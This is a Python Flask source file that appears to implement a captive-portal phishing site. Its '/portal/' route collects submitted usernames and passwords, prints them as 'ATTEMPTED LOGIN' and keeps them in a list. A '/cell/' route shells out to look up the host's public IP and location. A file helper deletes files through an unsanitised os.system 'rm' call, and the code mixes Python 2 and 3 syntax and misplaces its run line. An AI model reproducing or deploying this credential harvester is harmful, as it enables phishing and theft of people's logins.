import os, yaml, logging
from flask import Flask, render_template, Markup, request
if os.name != 'nt':
    try:
        import markdown, logging
    except:
        pass

app = Flask(__name__)
app.config.from_pyfile('settings.py')
cache = {}
logger = logging.getLogger(__name__)


USERS = []


def swap(fname, destroy):
    data = []
    for line in open(fname, 'r').readlines():
        data.append(line.replace('\n',''))
    if destroy:
        os.system('rm '+fname)
    return data


def get_page(dir, file):
    filename = (file)

    if filename in cache:
        return cache[filename]

    path = os.path.abspath(os.path.join(os.path.dirname(__file__), dir,filename))
    try:
        file_contents = open(path, encoding='utf-8').read()
    except:
        return None

    data, text = file_contents.split('---\n', 1)
    page = yaml.load(data)
    page['content'] = Markup(markdown.markdown(text))
    page['path'] = file

    cache[filename] = page
    return page


@app.route('/hello/')
@app.route('/hello/<name>')
def hello(name=None):
    return render_template('hello.html', name=name)


@app.route('/')
def login():
    return render_template('sample.html')


@app.route('/cell/')
def switch():
    cmd = "GET https://ipinfo.io/$(GET 'https://api.ipify.org?format=json' | jq -r .'ip')"
    os.system(cmd+'>>user.txt')
    os.system('echo $('+cmd+")")
    print 'WAS CLICKED at :\n '
    data = ''
    for line in swap('user.txt', True):
        data += line
    return 'CLICKED BY ' + data


@app.route('/Automata/')
def play():
    return render_template('video_player.html')


@app.route('/login')
def flask_captive():
    return render_template('login.html')


@app.route('/portal/', methods=['POST','GET'])
def flask_portal():
    if request.method == 'POST':
        Credentials = request.form
        print "ATTEMPTED LOGIN:"
        print "User: "+Credentials['password']
        print "Password:"+Credentials['name']
        for line in swap('user.txt',True):
            print '*  '+line
        USERS.append(Credentials)
        if len(Credentials['password'])<2 or len(Credentials['name'])<2:
            return render_template('login.html')
        else:
            return "WELCOME "+Credentials['name']


###########################################################################################


if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
app.run(debug=True, host='0.0.0.0', port=port)
